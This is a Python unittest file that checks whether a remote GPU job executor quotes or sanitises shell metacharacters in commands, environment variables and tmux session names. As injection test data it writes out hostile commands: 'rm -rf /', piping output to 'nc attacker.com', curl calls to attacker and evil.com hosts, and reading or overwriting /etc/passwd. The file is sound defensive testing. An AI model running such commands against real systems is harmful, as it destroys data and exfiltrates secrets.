"""
Shell Injection Safety Tests

Tests to verify that user-provided commands, environment variables, and
node configurations cannot cause shell injection attacks via metacharacters.

Critical test coverage for P1.7: Verify shell injection safety with metacharacters.

Test Categories:
1. Command injection via user command strings
2. Injection via environment variable values
3. Injection via environment variable names
4. Injection via tmux session names
5. Complex metacharacter combinations
6. Multi-stage injection attempts

Security requirements from backend-task.md:
- shell injection 방지(인자 안전성)
- 실패 시 원인/해결 힌트가 사용자에게 명확히 보여야 함
"""

import asyncio
import unittest
from unittest.mock import AsyncMock, mock_open, patch

from opensmi.executor import route_command_to_target, route_commands_one_to_one
from opensmi.models import NodeConfig, NodeTarget, RemoteExecutionContext
from opensmi.sshutil import ssh_exec_remote


class TestShellInjectionSafety(unittest.TestCase):
    """Test suite for shell injection prevention with metacharacters."""

    def setUp(self):
        """Set up test fixtures."""
        self.node_config = NodeConfig(
            alias="test-node",
            address="192.168.1.10",
            user="testuser",
            port=22,
            connect_timeout_s=10,
        )

    def test_command_with_semicolon_injection_attempt(self):
        """Test that semicolon command separator is safely handled."""
        # Attempt to inject `; rm -rf /` after legitimate command
        malicious_command = "python train.py; rm -rf /"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={"CUDA_VISIBLE_DEVICES": "0"},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="training complete",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            # Verify ssh_exec_remote was called with the malicious command AS-IS
            # The command should be passed through bash -c with proper quoting
            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(call_args.kwargs["command"], malicious_command)

            # The actual SSH layer should receive ["bash", "-c", full_command]
            # where full_command contains the malicious string but is properly quoted
            # This test verifies the command reaches ssh_exec_remote unchanged,
            # and ssh_exec_remote is responsible for safe execution

    def test_command_with_pipe_injection_attempt(self):
        """Test that pipe operator is safely handled."""
        # Attempt to pipe output to attacker-controlled script
        malicious_command = "python train.py | nc attacker.com 1337"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            # Verify the command is passed through unchanged
            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(call_args.kwargs["command"], malicious_command)

    def test_command_with_backtick_injection_attempt(self):
        """Test that backtick command substitution is safely handled."""
        # Attempt to execute arbitrary command via backticks
        malicious_command = "python train.py --name `whoami`"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(call_args.kwargs["command"], malicious_command)

    def test_command_with_dollar_paren_injection_attempt(self):
        """Test that $() command substitution is safely handled."""
        # Attempt to execute arbitrary command via $()
        malicious_command = "python train.py --name $(whoami)"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(call_args.kwargs["command"], malicious_command)

    def test_command_with_ampersand_background_injection(self):
        """Test that background process injection is safely handled."""
        # Attempt to run malicious background process
        malicious_command = "python train.py & curl http://attacker.com/exfil"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()

    def test_command_with_redirection_injection(self):
        """Test that output redirection is safely handled."""
        # Attempt to overwrite sensitive files
        malicious_command = "python train.py > /etc/passwd"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()

    def test_env_var_value_injection_with_semicolon(self):
        """Test that environment variable values with semicolons are safely handled."""
        # Attempt to inject command via environment variable value
        malicious_env_value = "0,1; rm -rf /"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command="python train.py",
            env_vars={"CUDA_VISIBLE_DEVICES": malicious_env_value},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command="python train.py",
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            # Verify the env_vars were passed through
            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(
                call_args.kwargs["env_vars"]["CUDA_VISIBLE_DEVICES"],
                malicious_env_value,
            )

            # The actual injection safety is verified by checking that
            # ssh_exec_remote properly escapes/quotes the environment variables
            # when building the final SSH command

    def test_env_var_value_injection_with_backticks(self):
        """Test that environment variable values with backticks are safely handled."""
        malicious_env_value = "`whoami`"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command="python train.py",
            env_vars={"USER_INPUT": malicious_env_value},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command="python train.py",
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(
                call_args.kwargs["env_vars"]["USER_INPUT"],
                malicious_env_value,
            )

    def test_env_var_value_injection_with_dollar_paren(self):
        """Test that environment variable values with $() are safely handled."""
        malicious_env_value = "$(rm -rf /)"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command="python train.py",
            env_vars={"USER_INPUT": malicious_env_value},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command="python train.py",
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()

    def test_tmux_session_name_injection_with_semicolon(self):
        """Test that tmux session names with semicolons are sanitized."""
        malicious_session_name = "session; rm -rf /"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command="python train.py",
            env_vars={"CUDA_VISIBLE_DEVICES": "0"},
            execution_mode="tmux",
            tmux_session=malicious_session_name,
        )

        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(return_value=(b"", b""))
        mock_proc.returncode = 0
        mock_proc.wait = AsyncMock(return_value=0)

        with patch(
            "asyncio.create_subprocess_exec", new_callable=AsyncMock, return_value=mock_proc
        ) as mock_subproc, patch("builtins.open", mock_open()), \
             patch("os.makedirs"), patch("os.chmod"):

            result = asyncio.run(route_command_to_target(context))

            self.assertTrue(result.success)
            # Verify the session name was sanitized (no semicolons)
            call_args = mock_subproc.call_args[0]
            session_arg = call_args[call_args.index("-s") + 1]
            self.assertNotIn(";", session_arg)
            self.assertNotIn(" ", session_arg)

    def test_tmux_session_name_injection_with_backticks(self):
        """Test that tmux session names with backticks are sanitized."""
        malicious_session_name = "`whoami`"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command="python train.py",
            env_vars={},
            execution_mode="tmux",
            tmux_session=malicious_session_name,
        )

        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(return_value=(b"", b""))
        mock_proc.returncode = 0
        mock_proc.wait = AsyncMock(return_value=0)

        with patch(
            "asyncio.create_subprocess_exec", new_callable=AsyncMock, return_value=mock_proc
        ) as mock_subproc, patch("builtins.open", mock_open()), \
             patch("os.makedirs"), patch("os.chmod"):

            result = asyncio.run(route_command_to_target(context))

            self.assertTrue(result.success)
            # Verify backticks were sanitized
            call_args = mock_subproc.call_args[0]
            session_arg = call_args[call_args.index("-s") + 1]
            self.assertNotIn("`", session_arg)

    def test_complex_multi_stage_injection_attempt(self):
        """Test complex injection with multiple metacharacters."""
        # Combine multiple injection vectors
        malicious_command = "python train.py --data '$(cat /etc/passwd)' | tee /tmp/exfil & curl http://evil.com"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=malicious_command,
            env_vars={"USER": "`whoami`"},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=malicious_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()

    def test_one_to_one_mode_injection_safety(self):
        """Test that one-to-one mode is safe from injection attacks."""
        # Create contexts with malicious commands
        contexts = [
            RemoteExecutionContext(
                target=NodeTarget(
                    node_alias="test-node",
                    gpu_indices=[0],
                    node_config=self.node_config,
                ),
                command="python train.py --fold 0; rm -rf /",
                execution_mode="direct",
            ),
            RemoteExecutionContext(
                target=NodeTarget(
                    node_alias="test-node",
                    gpu_indices=[1],
                    node_config=self.node_config,
                ),
                command="python train.py --fold 1 | nc attacker.com 1337",
                execution_mode="direct",
            ),
        ]

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.side_effect = [
                AsyncMock(
                    exit_code=0,
                    stdout="fold 0 complete",
                    stderr="",
                    node_alias="test-node",
                    command="python train.py --fold 0; rm -rf /",
                    success=True,
                ),
                AsyncMock(
                    exit_code=0,
                    stdout="fold 1 complete",
                    stderr="",
                    node_alias="test-node",
                    command="python train.py --fold 1 | nc attacker.com 1337",
                    success=True,
                ),
            ]

            async def run():
                results = await route_commands_one_to_one(contexts)
                return results

            results = asyncio.run(run())

            # Verify all commands were executed
            self.assertEqual(len(results), 2)
            self.assertEqual(mock_ssh.call_count, 2)

    def test_quotes_in_command_are_preserved(self):
        """Test that quotes in commands are properly preserved."""
        # Commands with quotes should work correctly
        command_with_quotes = (
            """python train.py --message 'hello world' --name "test user" """
        )

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=command_with_quotes,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=command_with_quotes,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            # Verify quotes are preserved in the command
            self.assertIn("'hello world'", call_args.kwargs["command"])
            self.assertIn('"test user"', call_args.kwargs["command"])

    def test_newlines_in_command_are_handled(self):
        """Test that newlines in commands don't break execution."""
        # Multi-line commands should be handled safely
        multiline_command = "python train.py \\\n  --epochs 100 \\\n  --batch-size 32"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command=multiline_command,
            env_vars={},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command=multiline_command,
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(call_args.kwargs["command"], multiline_command)

    def test_env_var_with_equals_sign_in_value(self):
        """Test that environment variables with = in value are handled."""
        # Environment variable values can legitimately contain =
        env_value_with_equals = "key1=value1,key2=value2"

        target = NodeTarget(
            node_alias="test-node",
            gpu_indices=[0],
            node_config=self.node_config,
        )

        context = RemoteExecutionContext(
            target=target,
            command="python train.py",
            env_vars={"CONFIG": env_value_with_equals},
            execution_mode="direct",
        )

        with patch(
            "opensmi.executor.ssh_exec_remote", new_callable=AsyncMock
        ) as mock_ssh:
            mock_ssh.return_value = AsyncMock(
                exit_code=0,
                stdout="",
                stderr="",
                node_alias="test-node",
                command="python train.py",
                success=True,
            )

            async def run():
                result = await route_command_to_target(context)
                return result

            result = asyncio.run(run())

            mock_ssh.assert_called_once()
            call_args = mock_ssh.call_args
            self.assertEqual(
                call_args.kwargs["env_vars"]["CONFIG"],
                env_value_with_equals,
            )


class TestSSHExecRemoteInjectionSafety(unittest.TestCase):
    """Direct tests for ssh_exec_remote function injection safety."""

    def setUp(self):
        """Set up test fixtures."""
        self.node_config = NodeConfig(
            alias="test-node",
            address="192.168.1.10",
            user="testuser",
            port=22,
            connect_timeout_s=10,
        )

    def test_ssh_exec_remote_command_with_semicolon(self):
        """Test ssh_exec_remote with semicolon in command."""
        malicious_command = "python train.py; rm -rf /"

        with patch(
            "opensmi.sshutil.ssh_run_with_retry", new_callable=AsyncMock
        ) as mock_run:
            mock_run.return_value = (0, "output", "")

            async def run():
                result = await ssh_exec_remote(
                    node=self.node_config,
                    command=malicious_command,
                )
                return result

            result = asyncio.run(run())

            # Verify ssh_run_with_retry was called with ["bash", "-c", command]
            mock_run.assert_called_once()
            call_args = mock_run.call_args

            # The remote_args should be ["bash", "-c", full_command]
            remote_args = call_args[0][1]  # Second positional arg
            self.assertEqual(remote_args[0], "bash")
            self.assertEqual(remote_args[1], "-c")
            # The command should be in remote_args[2]
            self.assertIn(malicious_command, remote_args[2])

    def test_ssh_exec_remote_env_vars_with_special_chars(self):
        """Test ssh_exec_remote with environment variables containing special characters."""
        command = "python train.py"
        malicious_env = {
            "USER_INPUT": "$(whoami)",
            "DATA_PATH": "/path; rm -rf /",
        }

        with patch(
            "opensmi.sshutil.ssh_run_with_retry", new_callable=AsyncMock
        ) as mock_run:
            mock_run.return_value = (0, "output", "")

            async def run():
                result = await ssh_exec_remote(
                    node=self.node_config,
                    command=command,
                    env_vars=malicious_env,
                )
                return result

            result = asyncio.run(run())

            mock_run.assert_called_once()
            call_args = mock_run.call_args

            remote_args = call_args[0][1]
            full_command = remote_args[2]

            # Verify shlex.quote() has properly escaped the malicious values
            # The values should be wrapped in single quotes to prevent execution
            self.assertIn("USER_INPUT='$(whoami)'", full_command)
            self.assertIn("DATA_PATH='/path; rm -rf /'", full_command)

            # Verify the actual command is present and unchanged
            self.assertIn("python train.py", full_command)


if __name__ == "__main__":
    unittest.main()
